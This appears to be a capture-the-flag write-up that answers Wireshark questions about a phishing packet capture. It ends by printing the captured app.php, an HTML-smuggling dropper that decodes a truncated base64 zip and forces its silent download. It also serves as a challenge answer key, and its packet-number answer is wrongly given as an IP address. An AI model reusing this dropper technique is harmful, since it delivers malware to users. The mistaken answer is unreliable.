# Wireshark Phishing

This was a set of instructions to answer questions at the terminal.

![Wireshark Phishing Terminal](/img/tolkienring/wireshark.png)

```
This all started when I clicked on a link in my email. 
Can you help me? 
```

Answer: `Yes`

```
There are objects in the PCAP file that can be exported by Wireshark and/or Tshark. What type of objects can be exported from this PCAP?
```

Answer `http`

```
What is the file name of the largest file we can export?
```

Answer `app.php`

```
What packet number starts that app.php file?
```

Answer `192.185.57.242`

```
What file is saved to the infected host?
```

After reviewing the PHP code that was saved, I discovered:

Answer: `Ref_Sept24-2020.zip`

```
Attackers used bad TLS certificates in this traffic. Which countries were they registered to? Submit the names of the countries in alphabetical order separated by a commas (Ex: Norway, South Korea).
```

This was weird, had to filter on `tls.handshake.type == 11` to obtain all the TLS certs. I opened all the certs and simply chose any that weren't from Redmond WA. In this order, it was:

Answer: `Israel, South Sudan`


```
Was the host infected? Yes/No
```

Answer: `Yes`

Said yes because the php script I reviewed looked realllly fishy...

```php lineenums="1"
<script>

	let d = -new Date().getTimezoneOffset();
	let n = Intl.DateTimeFormat().resolvedOptions().timeZone;

	function set_cookie (name, value, minutes) {
	  
		let date = new Date();
		date.setTime(date.getTime() + (minutes * 60 * 1000));
		
		let expires = "";
		
		if (minutes)
			expires = "; expires="+date.toGMTString();
			
		document.cookie = name + "=" + escape (value) + expires+";path=/";   
	}

	function get_cookie (cookie_name) {
	  let results = document.cookie.match ('(^|;) ?' + cookie_name + '=([^;]*)(;|$)');
	 
	  if (results)
		return (unescape (results[2]));
	  else
		return null;
	}

	if (!get_cookie('d') && !get_cookie('n')) {
		set_cookie('d', d, 2);
		set_cookie('n', n, 2);
		document . location . reload();
	}

	</script><body>
<script>
function saveAs(blob, fileName) {
    let url = window.URL.createObjectURL(blob);

    let anchorElem = document.createElement('a');
    anchorElem.style = 'display: none';
    anchorElem.href = url;
    anchorElem.download = fileName;

    document.body.appendChild(anchorElem);
    anchorElem.click();

    document.body.removeChild(anchorElem);

    // On Edge, revokeObjectURL should be called only after
    // a.click() has completed, atleast on EdgeHTML 15.15048
    setTimeout(function() {
        window.URL.revokeObjectURL(url);
    }, 1000);
}

(function() {
    let byteCharacters = atob('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


    // snipping a HUGE base64 string for the sake of brevity

    aY1TC8dWE9qBSGR+jktdkyYRJ9agFBE2jOrWUjIYgDWi4cvQBqjcE4+lAWRWmQ4BJkN7cAzzJlBl2ot9AZwen8GZ/
    tGgbhWwhKN984qDxQf5fg7W3/Y6hGeZ2MyeQ1qhopcyYOC2a0J5NclRIxsg6NMnBq85hjZWkwOfpm4aUuUWQ9J3KJP/
    f110cFdL6xfWsuHJT6OTdEW/XJkts0n9bweQLOTIUOhtgDVUpVvhhphRcAzdGLOKNy7d7X3OeucJw3ZRpezS9jzEA5dcHeX6k3b/
    RgtWzXCnK2A23NvvNtW8P0AAAAAAAAAAHV432BVddro/2vtRn59+i/EPXsAQAcAUEsBAh8AFAAAAAgAUKM3UUirsfh7OwkAg3oLABMAJA
    AAAAAAAAAgAAAAAAAAAFJlZl9TZXB0MjQtMjAyMC5zY3IKACAAAAAAAAEAGABgQXRy35HWAQVnJmJUktYBBWcmYlSS1gFQSwUGAAAAAAE
    AAQBlAAAArDsJAAAA');
	
    let byteNumbers = new Array(byteCharacters.length);
    for (let i = 0; i < byteCharacters.length; i++) {
        byteNumbers[i] = byteCharacters.charCodeAt(i);
    }
    let byteArray = new Uint8Array(byteNumbers);
    
    // now that we have the byte array, construct the blob from it
    let blob1 = new Blob([byteArray], {type: 'application/octet-stream'});

    saveAs(blob1, 'Ref_Sept24-2020.zip');
	
})();

</script>
</body>
```